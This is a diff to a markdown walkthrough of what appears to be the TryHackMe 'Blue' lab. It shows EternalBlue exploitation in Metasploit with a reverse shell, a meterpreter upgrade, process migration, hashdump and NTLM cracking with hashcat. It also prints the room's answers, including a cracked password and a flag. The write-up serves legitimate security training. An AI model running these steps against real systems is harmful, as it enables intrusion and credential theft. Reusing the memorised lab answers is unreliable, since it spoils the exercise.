@@ -51,12 +51,9 @@ We will need to use Metasploit for this portion
 <br/><br/>
 Lets run "msfdb init" (MetaSploit Framework DataBase Initialize)
 <br/><br/>
-Now lets run "msfdb start" to make sure the database is started
+Now lets run "msfconsole"
 <br/><br/>
-<br/><br/>
-**Previous steps may not be needed** lets run "msfconsole"
-<br/><br/>
-Once we get ourt ASCII art we can run the next command
+Once we get our ASCII art we can run the next command
 <br/><br/>
 "search ms17-010"
 <br/><br/>
@@ -64,11 +61,15 @@ This will show several options but since weknow we have a Windows machine we can
 <br/><br/>
 "use 2" will choose the second choice
 <br/><br/>
-**"xploit/windows/smb/ms17_010_eternalblue" is the answer for the full path of the code**
+**"exploit/windows/smb/ms17_010_eternalblue"** is the answer for the full path of the code
 br/><br/>
 Next up "Set RHOSTS *IP of Active machine*"
 <br/><br/>
-**"RHOSTS" is the answer for the name of the value**
+**"RHOSTS"** is the answer for the name of the value
+<br/><br/>
+We will also need to set the LHOSTS to tun0
+<br/><br/>
+"set LHOST tun0" due to using a vpn
 <br/><br/>
 "show options" will show all the required areas are now done
 <br/><br/>
@@ -76,42 +77,89 @@ The room wants us to use "set payload windows/x64/shell/reverse_tcp" before we d
 <br/><br/>
 all we have to do now is type "run"
 <br/><br/>
+No we are in! (You may need to press enter) 
 <br/><br/>
+**TASK 3**
 <br/><br/>
+Type "whoami" to see if we are now connected as "nt authority\system"
 <br/><br/>
+place this session in the background with "ctrl+Z"
 <br/><br/>
+now we need to search for shell_to_meterpreter
 <br/><br/>
+"search shell_to_meterpreter"
 <br/><br/>
+We now see the answer to a question!
 <br/><br/>
+"**post/multi/manage/shell_to_meterpreter**"
 <br/><br/>
+Now lets use what we found
 <br/><br/>
+"use post/multi/manage/shell_to_meterpreter"
 <br/><br/>
+use "show options" and we see we need to change "**Session**"
 <br/><br/>
+now we need to set our session
 <br/><br/>
+use "sessions" to find your sessions #
 <br/><br/>
+"set session *Session #*"
 <br/><br/>
+once that is done type "sessions" and it should have new information under "Information"
 <br/><br/>
+type "session *session #*
 <br/><br/>
+now it should show "meterpreter" on the current line
 <br/><br/>
+try using "shell" and then "whoami" to see if we are system
 <br/><br/>
+press "ctrl+z" to get back to meterpreter
 <br/><br/>
+Now lets look at processes w/ "ps"
 <br/><br/>
+now we need to try and migrate to one of these processes
 <br/><br/>
+I used "migrate 2536" to go to svchost.exe but your masy be different
 <br/><br/>
+**TASK 4**
 <br/><br/>
+Now we get to play with hashes!
 <br/><br/>
+"hashdump" will give us 3 hashes
 <br/><br/>
+"**Jon**" is the answer to 1 question of Task 4
 <br/><br/>
+if you google "windows password hash format" you will see they are either LM or NTLM
 <br/><br/>
+Lets try to crack all 3 with hashcat!
 <br/><br/>
+Lets save them as a document named "Bluehashes.txt"
 <br/><br/>
+you will need world lists for hashcat. I already had a "rockyou" list so I will use that
 <br/><br/>
+for hashcat we will use "sudo hashcat -a 0 -m 1000 Bluehashes.txt rockyou.wordlist --force --username --show > Hashed.txt"
 <br/><br/>
+-a is for the attack mode 0, -m 1000 is for the NTLM hash format, --force is for if you do not have a Intel OpenCL runtime, --username ignores the username, > Hashed.txt names a file with the output
 <br/><br/>
+In that new file at the end of Jons line is "**alqfna22**"
 <br/><br/>
+**TASK 5**
 <br/><br/>
+Now we need to find flags
 <br/><br/>
+"Flag1? This flag can be found at the system root."
 <br/><br/>
+"ls C:\\ will list the root
+<br/><br/>
+we now see "flag1.txt"
+<br/><br/>
+lets cat it!
+<br/><br/>
+"cat flag1.txt"
+<br/><br/>
+"**flag{access_the_machine}**"
+<br/><br/>
+The second flag is where passwords are stored which would be C:\windows\system32
 <br/><br/>
 <br/><br/>
 <br/><br/>
